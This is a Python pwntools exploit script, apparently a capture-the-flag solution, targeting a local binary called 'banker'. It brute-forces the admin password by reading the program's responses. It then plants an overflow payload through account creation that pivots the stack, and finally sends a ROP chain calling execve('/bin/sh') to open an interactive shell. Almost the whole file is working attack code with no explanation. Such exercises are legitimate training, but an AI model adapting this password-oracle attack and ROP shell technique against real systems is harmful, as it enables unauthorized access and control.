#!/usr/bin/env python
from pwn import *
import string

def enter_password(password = None):
    if password:
        s.sendlineafter('username: ', 'admin')
        s.sendlineafter('password: ', password)
        return True

    letters = ''.join(sorted(string.letters + string.digits))
    length = len(letters)
    l = 0
    r = length ** 8 * 8
    while l + 1 < r:
        m = (l + r) // 2
        password = ''
        x = m
        for i in range(8):
            password = letters[x % length] + password
            x //= length
        password = password[:x+1]
        log.info('Password: %s' % password)
        s.sendlineafter('username: ', 'admin')
        s.sendlineafter('password: ', password)
        res = s.recvline(False)
        while 'delayed' in res:
            res = s.recvline(False)
        print res
        if 'Successfully' in res:
            return True
        elif '-1' in res:
            r = m
        else:
            l = m
    return False

def create(username, password):
    delete(username)
    s.sendlineafter('Console\n', '6')
    s.sendlineafter('Exit\n', '1')
    s.sendlineafter('Username: ', username)
    s.sendlineafter('Password: ', password)
    s.sendlineafter('Exit\n', '4')

def delete(username):
    s.sendlineafter('Console\n', '6')
    s.sendlineafter('Exit\n', '3')
    s.sendlineafter('delete: ', username)
    s.sendlineafter('Exit\n', '4')

def logout():
    s.sendlineafter('Console\n', '5')

if __name__ == '__main__':
    s = process('./banker')

    elf = ELF('./banker')

    if not enter_password():
        exit(0)

    pop_eax = 0x8057c56
    pop_ecx_ebx = 0x8083651
    pop_edx = 0x808362a
    read_line = 0x804a6b0
    leave = 0x8048d98
    int_0x80 = 0x8084040

    payload = ''
    payload += 'A' * 0x3e
    payload += p32(elf.bss(0x500 - 0x4))

    payload += p32(read_line)
    payload += p32(leave)
    payload += p32(elf.bss(0x600)) + p32(elf.bss(0x500)) + p32((1<<31)-1)

    create('A', payload)
    logout()

    payload = ''
    payload += p32(pop_eax) + p32(0xb)
    payload += p32(pop_ecx_ebx) + p32(0) + p32(elf.bss(0x520))
    payload += p32(pop_edx) + p32(0)
    payload += p32(int_0x80)
    payload += '/bin/sh\0'
    s.sendline(payload)

    s.interactive()
